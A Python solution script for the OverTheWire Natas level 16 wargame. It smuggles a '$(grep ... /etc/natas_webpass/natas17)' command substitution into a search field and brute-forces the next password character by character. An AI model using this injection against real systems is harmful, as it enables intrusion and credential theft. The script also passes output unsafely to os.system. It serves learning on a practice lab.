import requests, os, sys
from pwn import *
from requests.auth import HTTPBasicAuth
import urllib.parse
import string, signal


def ctrl_c_handler(sig, frame):
    print('\n\n[*] Exit...\n')
    sys.exit(1)

signal.signal(signal.SIGINT, ctrl_c_handler)


def get_password(user):
    file = open(f'credentials/{user}', 'r')
    password = file.read().replace('\n', '')
    file.close()
    return password


user = 'natas16'
password = get_password(user) 
url = f"http://{user}.natas.labs.overthewire.org"


def make_request(params):
    auth = HTTPBasicAuth(user, password)
    res = requests.get(url, auth=auth, params=params)
    return res.text


def brute_force_attack():
    characters = f'{string.ascii_letters}{string.digits}'
    diccionary_word = 'aftermaths'
    natas17_password = ''

    attack_progress = log.progress('Brute force command injection attack')
    attack_progress.status('Starting attack...')
    password_progress = log.progress('Password')

    while True:
        found = False
        for c in characters:
            cmd_injection = f'{diccionary_word}$(grep -oP ^{natas17_password}{c} /etc/natas_webpass/natas17)'
            attack_progress.status(f'Trying with {c} character')
            res = make_request({ 'needle': cmd_injection, 'submit': 'Search' })
            if diccionary_word not in res:
                natas17_password += c
                password_progress.status(natas17_password)
                found = True
                break

        if found == False:
            break

    attack_progress.success(f'Password found {natas17_password}')
    return natas17_password


if __name__ == "__main__":
    password_found = brute_force_attack()
    os.system(f'echo "{password_found}" > credentials/natas17')

